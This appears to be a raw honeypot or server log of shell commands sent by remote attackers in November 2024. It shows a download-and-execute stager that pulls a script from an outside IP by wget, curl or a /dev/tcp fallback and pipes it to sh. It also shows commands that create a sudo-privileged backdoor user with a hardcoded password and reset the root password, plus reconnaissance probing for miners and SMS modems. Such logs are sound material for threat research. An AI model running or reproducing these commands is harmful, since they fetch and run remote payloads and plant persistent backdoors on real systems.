start
2024-11-19 20:47:48.246951 - ('87.120.113.231', 35844) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 01:20:09.139999 - ('46.19.143.66', 50904) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZcEFv9UX) system && sudo usermod -aG sudo system
2024-11-20 01:20:09.349514 - ('46.19.143.66', 50904) - lscpu && echo -e "ZcEFv9UX\nZcEFv9UX" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-20 03:08:12.965693 - ('87.120.113.231', 60880) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-20 09:44:01.868849 - ('180.227.239.244', 57637) - /ip cloud print
2024-11-20 09:44:03.460935 - ('180.227.239.244', 57637) - ifconfig
2024-11-20 09:44:04.765995 - ('180.227.239.244', 57637) - uname -a
2024-11-20 09:44:06.078320 - ('180.227.239.244', 57637) - cat /proc/cpuinfo
2024-11-20 09:44:07.386951 - ('180.227.239.244', 57637) - ps | grep '[Mm]iner'
2024-11-20 09:44:08.697180 - ('180.227.239.244', 57637) - ps -ef | grep '[Mm]iner'
2024-11-20 09:44:10.005867 - ('180.227.239.244', 57637) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-20 09:44:11.317567 - ('180.227.239.244', 57637) - echo Hi | cat -n
